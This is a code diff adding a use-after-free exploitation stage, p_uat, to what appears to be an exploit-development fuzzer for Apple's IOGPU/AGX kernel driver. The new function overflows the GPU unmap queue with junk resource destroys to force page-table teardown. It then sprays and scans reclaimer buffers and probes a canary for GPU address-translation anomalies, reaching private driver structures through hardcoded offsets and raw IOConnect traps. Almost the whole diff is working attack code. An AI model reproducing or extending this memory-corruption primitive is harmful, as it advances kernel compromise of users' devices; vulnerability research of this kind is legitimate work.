@@ -17142,6 +17142,110 @@ static void p_reclaim2(void) {
     LOG("[recl2] done (alive)");
 }
 
+// V108: close the UAF via AGXUAT force-flush. Statics: destroy → queueUnmap
+// (queue max 32); the 33rd unmap forces AGXUAT::process = PTE clear → pages to
+// the shared pool → CPU tlbi → async firmware GMMU invalidate (window!).
+// Steps: 1 = flush + immediate spray; 2 = flush + drain + spray;
+// 3 = flush + small-alloc storm (page-table target) + translation anomaly check.
+static void p_uat(void) {
+    int step = atoi(getenv("FUZZ_UAT_STEP") ?: "1");
+    LOG("[uat] v108 step %d", step);
+    io_connect_t ourc = open_service("IOGPU", 1);
+    id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
+    id<MTLCommandQueue> mq = [dev newCommandQueue];
+    uint8_t *devObj = *(uint8_t **)((uint8_t *)(__bridge void *)mq + 392);
+    uint8_t *dref = devObj ? *(uint8_t **)(devObj + 656) : NULL;
+    io_connect_t mconn = dref ? *(uint32_t *)(dref + 0x14) : 0;
+    if (!mconn || !dev) return;
+
+    // garbage resources for the forced flush (created upfront)
+    uint32_t junk[40];
+    int njunk = 0;
+    for (int i = 0; i < 40; i++) {
+        uint64_t g; uint8_t *p;
+        uint32_t r = gpu_resource2(mconn, 0x1000, &g, &p);
+        if (r) junk[njunk++] = r;
+    }
+    LOG("[uat] %d junk resources ready", njunk);
+
+    // canary for step 3 (created BEFORE the race)
+    uint64_t gc = 0;
+    uint8_t *cc = NULL;
+    uint32_t ridC = 0;
+    if (step == 3) {
+        ridC = gpu_resource2(mconn, 0x10000, &gc, &cc);
+        if (cc) memset(cc, 0x33, 0x10000);
+        LOG("[uat] canary rid %u gpuva 0x%llx filled 0x33", ridC, gc);
+    }
+
+    uint32_t ridV;
+    race_prepare(dev, mq, mconn, 0x10000, &ridV, 8);
+    fsync(fileno(stderr));
+    kern_return_t kd = ioconnect_trap1(mconn, 1, ridV);
+    int nd = 0;
+    for (int i = 0; i < njunk; i++) { ioconnect_trap1(mconn, 1, junk[i]); nd++; }
+    LOG("[uat] destroy victim kr 0x%08x + %d junk destroys => queueUnmap overflow (force process)", kd, nd);
+
+    if (step == 1) {
+        // hold 64 reclaimers alive THROUGH the drain, scan after the blit ran
+        LOG("[uat] immediate reclaim set (queue still congested)");
+        NSMutableArray *hold = [NSMutableArray new];
+        for (int i = 0; i < 64; i++) {
+            id<MTLBuffer> b = [dev newBufferWithLength:0x10000 options:MTLResourceStorageModeShared];
+            if (b) { memset([b contents], 0x22, 0x10000); [hold addObject:b]; }
+        }
+        for (int w = 0; w < 40; w++) { if ((long)[g_racecb status] >= 4) break; usleep(50000); }
+        LOG("[uat] drained (cb status %ld), scanning %lu reclaimers", (long)[g_racecb status], (unsigned long)[hold count]);
+        int hits = 0;
+        for (id<MTLBuffer> b in hold) {
+            uint8_t *p = (uint8_t *)[b contents];
+            long n41 = 0;
+            for (int j = 0; j < 0x10000; j++) if (p[j] == 0x41) n41++;
+            if (n41 > 0x100) {
+                LOG("[uat] *** reclaimer got %ld/65536 0x41 bytes — UAF WRITE INTO LIVE OBJECT ***", n41);
+                hits++;
+            }
+        }
+        LOG("[uat] reclaim scan done: %d hits", hits);
+    } else if (step == 2) {
+        for (int w = 0; w < 40; w++) { if ((long)[g_racecb status] >= 4) break; usleep(50000); }
+        LOG("[uat] drained (cb status %ld), spray 5s", (long)[g_racecb status]);
+        spray_timed(dev, 0x10000, 5);
+    } else if (step == 3) {
+        // consume the pool into GPU page tables: storm of tiny resources
+        int n = 0;
+        for (int i = 0; i < 2500; i++) {
+            uint64_t g; uint8_t *p;
+            if (gpu_resource2(mconn, 0x1000, &g, &p)) n++;
+        }
+        LOG("[uat] %d tiny resources allocated (page-table consumption)", n);
+        for (int w = 0; w < 40; w++) { if ((long)[g_racecb status] >= 4) break; usleep(50000); }
+        LOG("[uat] drained, cb status %ld (blit executed into V's freed pages)", (long)[g_racecb status]);
+        // translation anomaly check: canary via CPU (0x33) vs GPU read-probe
+        long cpuok = 0;
+        if (cc) for (int i = 0; i < 0x10000; i++) if (cc[i] == 0x33) cpuok++;
+        LOG("[uat] canary CPU readback: %ld/65536 0x33 bytes", cpuok);
+        // GPU read-probe of the canary GPUVA
+        id<MTLBuffer> rb = [dev newBufferWithLength:0x10000 options:MTLResourceStorageModeShared];
+        memset([rb contents], 0, 0x10000);
+        g_srcx = gc ^ 0x5a5a5a5a5a5a5a5aULL;   // probe source donor: use canary's own gpuva? no —
+        // proper: donor = a Metal buffer; reuse bufA pattern inside gscan2_one
+        id<MTLBuffer> donor = [dev newBufferWithLength:0x10000 options:MTLResourceStorageModeShared];
+        memset([donor contents], 0x55, 0x10000);
+        g_srcx = [donor gpuAddress] ^ 0x5a5a5a5a5a5a5a5aULL;
+        g_dstx = [rb gpuAddress] ^ 0x5a5a5a5a5a5a5a5aULL;
+        long np = gscan2_one(mq, donor, rb, gc, 0);
+        uint8_t *rp = (uint8_t *)[rb contents];
+        long n33 = 0, n41 = 0, nz = 0;
+        for (int i = 0; i < 0x10000; i++) { if (rp[i] == 0x33) n33++; if (rp[i] == 0x41) n41++; if (rp[i]) nz++; }
+        LOG("[uat] canary GPU-probe: slots %ld, 0x33 %ld, 0x41 %ld, nz %ld %s",
+            np, n33, n41, nz,
+            n41 ? "*** TRANSLATION ANOMALY: GPU sees 0x41 (blit content) at canary GPUVA — PTE HIT? ***" :
+            (n33 > 0x8000 ? "(translation intact)" : "(OTHER CONTENT — anomaly)"));
+    }
+    LOG("[uat] done (alive)");
+}
+
 static void p4b_uaf2(void) {
     LOG("[v13-d] UAF destroy-first (panic tolerated)");
     IOSurfaceRef big1 = make_surface(2048, 2048);
@@ -17272,6 +17376,7 @@ void *t_iosurface_scaler(void *arg) {
     static int probed = 0;
     if (!probed) {
         probed = 1;
+        if (getenv("FUZZ_UAT")) { p_uat(); LOG("[probe13] uat-only mode, stop"); return NULL; }
         if (getenv("FUZZ_RECLAIM2")) { p_reclaim2(); LOG("[probe13] reclaim2-only mode, stop"); return NULL; }
         if (getenv("FUZZ_RECLAIM")) { p_reclaim(); LOG("[probe13] reclaim-only mode, stop"); return NULL; }
         if (getenv("FUZZ_GPUUAF")) { p_gpuuaf(); LOG("[probe13] gpuuaf-only mode, stop"); return NULL; }
